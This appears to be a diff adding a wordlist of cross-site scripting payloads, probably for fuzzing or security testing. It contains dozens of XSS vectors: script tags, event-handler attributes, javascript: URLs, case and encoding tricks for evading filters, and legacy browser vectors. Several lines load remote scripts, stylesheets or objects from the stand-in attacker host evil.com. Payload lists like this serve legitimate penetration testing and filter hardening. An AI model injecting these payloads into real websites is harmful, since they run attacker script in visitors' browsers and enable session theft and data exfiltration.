@@ -1,0 +1,47 @@
+<script>alert('XSS')</script>
+<img src=x onerror=alert('XSS')>
+<svg/onload=alert('XSS')>
+"><script>alert(String.fromCharCode(88,83,83))</script>
+'><script>alert('XSS')</script>
+<iframe src="javascript:alert('XSS')">
+<body onload=alert('XSS')>
+<input onfocus=alert('XSS') autofocus>
+<select onfocus=alert('XSS') autofocus>
+<textarea onfocus=alert('XSS') autofocus>
+<keygen onfocus=alert('XSS') autofocus>
+<video><source onerror="alert('XSS')">
+<audio src=x onerror=alert('XSS')>
+<details open ontoggle=alert('XSS')>
+<marquee onstart=alert('XSS')>
+javascript:alert('XSS')
+<script>alert`XSS`</script>
+<ScRiPt>alert('XSS')</sCrIpT>
+<IMG SRC=/ onerror="alert('XSS')">
+<img src=x onerror="javascript:alert('XSS')">
+<IMG SRC=javascript:alert('XSS')>
+<IMG SRC=JaVaScRiPt:alert('XSS')>
+<IMG """><SCRIPT>alert("XSS")</SCRIPT>">
+<IMG SRC=`javascript:alert("XSS")`>
+<<SCRIPT>alert("XSS");//<</SCRIPT>
+<SCRIPT SRC=http://evil.com/xss.js></SCRIPT>
+<IMG DYNSRC="javascript:alert('XSS')">
+<IMG LOWSRC="javascript:alert('XSS')">
+<BGSOUND SRC="javascript:alert('XSS');">
+<BR SIZE="&{alert('XSS')}">
+<LAYER SRC="http://evil.com/xss.html"></LAYER>
+<LINK REL="stylesheet" HREF="javascript:alert('XSS');">
+<META HTTP-EQUIV="refresh" CONTENT="0;url=javascript:alert('XSS');">
+<IFRAME SRC="javascript:alert('XSS');"></IFRAME>
+<FRAMESET><FRAME SRC="javascript:alert('XSS');"></FRAMESET>
+<TABLE BACKGROUND="javascript:alert('XSS')">
+<DIV STYLE="background-image: url(javascript:alert('XSS'))">
+<DIV STYLE="width: expression(alert('XSS'));">
+<STYLE>@import'http://evil.com/xss.css';</STYLE>
+<STYLE TYPE="text/javascript">alert('XSS');</STYLE>
+<STYLE TYPE="text/css">BODY{background:url("javascript:alert('XSS')")}</STYLE>
+<!--[if gte IE 4]><SCRIPT>alert('XSS');</SCRIPT><![endif]-->
+<BASE HREF="javascript:alert('XSS');//">
+<OBJECT TYPE="text/x-scriptlet" DATA="http://evil.com/xss.html"></OBJECT>
+<EMBED SRC="http://evil.com/xss.html"></EMBED>
+<XML SRC="http://evil.com/xss.xml"></XML>
+<HTML><BODY><?xml:namespace prefix="t" ns="urn:schemas-microsoft-com:time"><?import namespace="t" implementation="#default#time2"><t:set attributeName="innerHTML" to="XSS&lt;SCRIPT DEFER&gt;alert('XSS')&lt;/SCRIPT&gt;"></BODY></HTML>
